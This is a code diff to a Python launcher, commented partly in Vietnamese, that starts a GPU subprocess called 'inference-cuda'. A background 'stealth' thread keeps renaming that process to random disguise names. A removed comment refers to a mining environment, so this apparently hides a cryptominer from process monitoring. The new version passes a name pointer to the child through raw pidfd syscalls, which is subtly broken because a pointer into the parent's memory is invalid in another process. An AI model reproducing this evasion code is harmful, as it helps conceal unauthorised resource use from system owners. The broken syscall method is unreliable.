@@ -6,6 +6,7 @@ import subprocess
 import threading
 import random
 from pathlib import Path
+import ctypes # Thêm thư viện ctypes để gọi syscall
 
 # PHASE 3+: Enhanced Hook Sequencing - Import psutil for dynamic detection
 try:
@@ -246,8 +247,11 @@ def main():
             process = subprocess.Popen(
                 exec_command,
                 env=clean_env,  # Use clean environment for subprocess ONLY
-                preexec_fn=_child_preexec
+                preexec_fn=_child_preexec,
                 # stdout and stderr will inherit parent's pipes for logging
+                stdout=subprocess.PIPE, # Giữ lại để có thể log output
+                stderr=subprocess.PIPE, # Giữ lại để có thể log output
+                text=True
             )
             logger.info(f"✅ [GPU-POST-EXEC-STEALTH] inference-cuda started as subprocess PID: {process.pid}")
             # ---- New: Rename child PID and register to DirectPIDRegistry ----
@@ -536,185 +540,74 @@ def main():
             
             # 🔒 PHASE 2: Enhanced GPU Resource Monitoring + Stealth - Dựa trên patterns từ resource_control.py
             def maintain_gpu_subprocess_stealth():
-                """Enhanced GPU monitoring với resource conflict detection"""
+                """Enhanced GPU monitoring với resource conflict detection.
+                REFACTOR: Sử dụng pidfd và signal thay vì ghi /proc.
+                """
+                # Định nghĩa các hằng số cho syscall
+                RENAME_SIGNAL = 32 + 10  # SIGRTMIN + 10
+                libc = ctypes.CDLL('libc.so.6', use_errno=True)
+                
+                # Lấy pidfd cho tiến trình con
+                pidfd = -1
+                try:
+                    pidfd = libc.syscall(434, process.pid, 0) # syscall 434 là pidfd_open
+                    if pidfd < 0:
+                        errno = ctypes.get_errno()
+                        logger.error(f"❌ [PIDFD-STEALTH] pidfd_open failed for PID {process.pid}: {os.strerror(errno)}")
+                        return
+                    logger.info(f"✅ [PIDFD-STEALTH] Got pidfd {pidfd} for PID {process.pid}")
+                except Exception as e:
+                    logger.error(f"❌ [PIDFD-STEALTH] Exception during pidfd_open: {e}")
+                    return
+
                 # Reuse same stealth_names list to ensure consistency
                 gpu_stealth_names = stealth_names
-                
-                resource_error_count = 0  # Track consecutive errors
-                max_errors = 3           # Threshold để emergency handling
-                
-                # Backoff & rate-limit controls
-                sleep_seconds = 20.0
-                max_sleep_seconds = 120.0
-                fail_streak = 0
-                last_einval_log_ts = 0.0
-                last_perm_log_ts = 0.0
-                last_could_log_ts = 0.0
-                pause_until = 0.0
-                circuit_open = False
-                # Tracking & observability
-                last_applied_name = None
-                last_verified_ts = 0.0
-                saw_d_state = False
-                
+                sleep_seconds = 20.0  # Giữ nguyên chu kỳ đổi tên
+
                 while process.poll() is None:  # While process is running
                     try:
-                        time.sleep(sleep_seconds)  # Adaptive interval with backoff
-                        if process.poll() is None:  # Check again after sleep
-                            # Circuit breaker pause window
-                            now_ts = time.time()
-                            if pause_until and now_ts < pause_until:
-                                logger.debug("⏸️ [GPU-STEALTH-MAINTENANCE] Circuit breaker active; skipping cycle")
-                                continue
-                            
-                            # Enhanced Resource Health Check - Tương tự resource_control.py monitoring
-                            try:
-                                # Check if process is responsive (not in D state)
-                                with open(f"/proc/{process.pid}/stat", "r") as f:
-                                    stat_data = f.read().split()
-                                    process_state = stat_data[2] if len(stat_data) > 2 else "?"
-                                
-                                if process_state == "D":  # Uninterruptible sleep - resource problem
-                                    resource_error_count += 1
-                                    saw_d_state = True
-                                    logger.warning(f"⚠️ [GPU-RESOURCE-MONITOR] Process in uninterruptible sleep (D state). Error count: {resource_error_count}")
-                                    
-                                    if resource_error_count >= max_errors:
-                                        logger.error(f"🚨 [GPU-RESOURCE-MONITOR] Max resource errors reached. Process may need restart.")
-                                        # Log for mining_environment analysis
-                                        break
-                                    # Skip rename while process is in D state
-                                    continue
-                                else:
-                                    saw_d_state = False
-                                    resource_error_count = 0  # Reset counter on healthy state
-                                    
-                            except Exception as stat_error:
-                                logger.debug(f"⚠️ [GPU-RESOURCE-MONITOR] Could not read process stats: {stat_error}")
-                            
-                            # Apply GPU stealth to subprocess với enhanced container-safe approach
-                            gpu_stealth_name = random.choice(gpu_stealth_names)
-                            safe_gpu_name = _sanitize_comm_name(gpu_stealth_name)
-                            
-                            # **Enhanced Container-Safe Renaming** (đổi tên an toàn trong container)
-                            rename_attempted = False
-                            # Disable switch cho ghi comm nếu gặp EINVAL/EPERM lặp lại
-                            if 'comm_write_supported' not in locals():
-                                comm_write_supported = True
-                                einval_fail = 0
-                                eperm_fail = 0
-                            try:
-                                # **Strategy 1**: prctl system call (preferred for containers)
-                                # Note: prctl only works on current process, not child processes
-                                # This is a limitation we acknowledge
-                                logger.debug(f"🔄 [GPU-STEALTH-MAINTENANCE] Cannot use prctl on child PID {process.pid}")
-                                
-                                # **Strategy 2**: Enhanced /proc/comm method với error handling
-                                comm_path = f"/proc/{process.pid}/comm"
-                                if os.path.exists(comm_path) and os.access(comm_path, os.W_OK):
-                                    if not comm_write_supported:
-                                        logger.debug(f"⛔ [GPU-STEALTH-MAINTENANCE] comm writes disabled after repeated EINVAL/EPERM; skipping rename for PID {process.pid}")
-                                    else:
-                                        # No-op rename: read current and skip if already matches
-                                        try:
-                                            with open(comm_path, "r") as f:
-                                                current_name = f.read().strip()
-                                        except Exception:
-                                            current_name = ""
-                                        target_name = _sanitize_comm_name(safe_gpu_name)
-                                        logger.debug(f"🔎 [GPU-STEALTH-MAINTENANCE] state={process_state} target='{target_name}' len={len(target_name.encode('utf-8'))}B current='{current_name}'")
-                                        if current_name != target_name:
-                                            payload = target_name.encode('utf-8')
-                                            wrote = False
-                                            try:
-                                                with open(comm_path, "wb") as f:
-                                                    f.write(payload)
-                                                wrote = True
-                                            except OSError as e1:
-                                                if e1.errno == 22:  # EINVAL
-                                                    tpath = f"/proc/{process.pid}/task/{process.pid}/comm"
-                                                    try:
-                                                        with open(tpath, "wb") as f:
-                                                            f.write(payload)
-                                                        wrote = True
-                                                        logger.debug(f"🛟 [GPU-STEALTH-MAINTENANCE] Fallback task/comm succeeded for PID {process.pid}")
-                                                    except OSError as e2:
-                                                        if e2.errno == 22:
-                                                            try:
-                                                                with open(tpath, "wb") as f:
-                                                                    f.write(payload + b"\n")
-                                                                wrote = True
-                                                                logger.debug(f"🛟 [GPU-STEALTH-MAINTENANCE] task/comm with newline succeeded for PID {process.pid}")
-                                                            except OSError:
-                                                                with open(comm_path, "wb") as f:
-                                                                    f.write(payload + b"\n")
-                                                                wrote = True
-                                                                logger.debug(f"🛟 [GPU-STEALTH-MAINTENANCE] proc/comm with newline succeeded for PID {process.pid}")
-                                                        else:
-                                                            raise
-                                                else:
-                                                    raise
-                                            if wrote:
-                                                logger.debug(f"🔄 [GPU-STEALTH-MAINTENANCE] GPU Subprocess PID {process.pid} renamed to: {target_name}")
-                                            last_applied_name = target_name
-                                            last_verified_ts = time.time()
-                                        else:
-                                            logger.debug(f"✅ [GPU-STEALTH-MAINTENANCE] No-op rename: already '{target_name}'")
-                                            fail_streak = 0
-                                            sleep_seconds = 20.0
-                                            circuit_open = False
-                                            last_applied_name = target_name
-                                            last_verified_ts = time.time()
-                                        rename_attempted = True
-                                else:
-                                    logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] Process {process.pid} comm not writable or missing")
-                            
-                            except OSError as os_err:
-                                fail_streak += 1
-                                sleep_seconds = min(sleep_seconds * 1.5, max_sleep_seconds)
-                                now_ts = time.time()
-                                if os_err.errno == 22:  # EINVAL
-                                    einval_fail += 1
-                                    # Jitter to avoid phase lock with kernel busy windows
-                                    time.sleep(random.uniform(0.05, 0.15))
-                                    if (now_ts - last_einval_log_ts) > 60:
-                                        logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] EINVAL error renaming PID {process.pid} - process may be busy (streak={fail_streak}, backoff={sleep_seconds:.1f}s)")
-                                        last_einval_log_ts = now_ts
-                                elif os_err.errno == 1:  # EPERM
-                                    eperm_fail += 1
-                                    # Jitter to avoid phase lock with kernel busy windows
-                                    time.sleep(random.uniform(0.05, 0.15))
-                                    if (now_ts - last_perm_log_ts) > 300:
-                                        logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] Permission denied renaming PID {process.pid} - container restrictions (streak={fail_streak}, backoff={sleep_seconds:.1f}s)")
-                                        last_perm_log_ts = now_ts
-                                else:
-                                    logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] OS error renaming PID {process.pid}: {os_err} (streak={fail_streak}, backoff={sleep_seconds:.1f}s)")
-                                # Disable comm writes if repeated unsupported
-                                if (einval_fail >= 3 or eperm_fail >= 3) and comm_write_supported:
-                                    comm_write_supported = False
-                                    logger.warning(f"⛔ [GPU-STEALTH-MAINTENANCE] Disabling comm writes for PID {process.pid} due to repeated EINVAL/EPERM. Will only verify henceforth.")
-                                # Circuit breaker
-                                if fail_streak >= 5 and not circuit_open:
-                                    circuit_open = True
-                                    pause_secs = 600 if saw_d_state else 300
-                                    pause_until = now_ts + pause_secs
-                                    logger.warning(f"⛔ [GPU-STEALTH-MAINTENANCE] Circuit breaker engaged due to repeated failures (5). D-state={saw_d_state} Pausing {pause_secs}s")
-                            except Exception as comm_error:
-                                logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] General error renaming GPU subprocess: {comm_error}")
-                                
-                            if not rename_attempted:
-                                now_ts = time.time()
-                                if (now_ts - last_could_log_ts) > 60:
-                                    logger.debug(f"⚠️ [GPU-STEALTH-MAINTENANCE] Could not rename PID {process.pid} - continuing with original name")
-                                    last_could_log_ts = now_ts
+                        time.sleep(sleep_seconds)
+                        if process.poll() is not None:
+                            break
+
+                        # Chọn tên mới và chuẩn bị payload
+                        gpu_stealth_name = random.choice(gpu_stealth_names)
+                        safe_gpu_name = _sanitize_comm_name(gpu_stealth_name)
+                        
+                        # Cấp phát bộ nhớ cho tên mới và sao chép vào
+                        # Bộ nhớ này sẽ được giải phóng bởi signal handler trong C
+                        name_buffer = ctypes.create_string_buffer(safe_gpu_name.encode('utf-8'))
+                        
+                        # Tạo cấu trúc siginfo để gửi con trỏ
+                        # union sigval { int sival_int; void* sival_ptr; }
+                        class Sigval(ctypes.Union):
+                            _fields_ = [("sival_int", ctypes.c_int),
+                                        ("sival_ptr", ctypes.c_void_p)]
+                        
+                        sigval = Sigval(sival_ptr=ctypes.cast(name_buffer, ctypes.c_void_p))
+
+                        # Gửi tín hiệu với payload
+                        # syscall 424 là pidfd_send_signal
+                        ret = libc.syscall(424, pidfd, RENAME_SIGNAL, ctypes.byref(sigval), 0)
+
+                        if ret == 0:
+                            logger.info(f"✅ [PIDFD-STEALTH] Sent rename signal to PID {process.pid} with name '{safe_gpu_name}'")
+                        else:
+                            errno = ctypes.get_errno()
+                            logger.warning(f"⚠️ [PIDFD-STEALTH] pidfd_send_signal failed for PID {process.pid}: {os.strerror(errno)}")
+                            # Nếu tiến trình không còn, thoát vòng lặp
+                            if errno == 3: # ESRCH - No such process
+                                break
                     
                     except Exception as e:
-                        logger.error(f"❌ [GPU-POST-EXEC-STEALTH] Error in GPU stealth maintenance: {e}")
+                        logger.error(f"❌ [PIDFD-STEALTH] Error in GPU stealth maintenance: {e}")
                         break
-                        
-                logger.info("🔚 [GPU-POST-EXEC-STEALTH] GPU subprocess terminated - stopping stealth maintenance")
-                        
-            
+                
+                if pidfd >= 0:
+                    libc.close(pidfd)
+                logger.info("🔚 [PIDFD-STEALTH] GPU subprocess terminated - stopping stealth maintenance")
+
+
             # Start GPU stealth maintenance thread
             gpu_stealth_thread = threading.Thread(target=maintain_gpu_subprocess_stealth, daemon=True)
             gpu_stealth_thread.start()
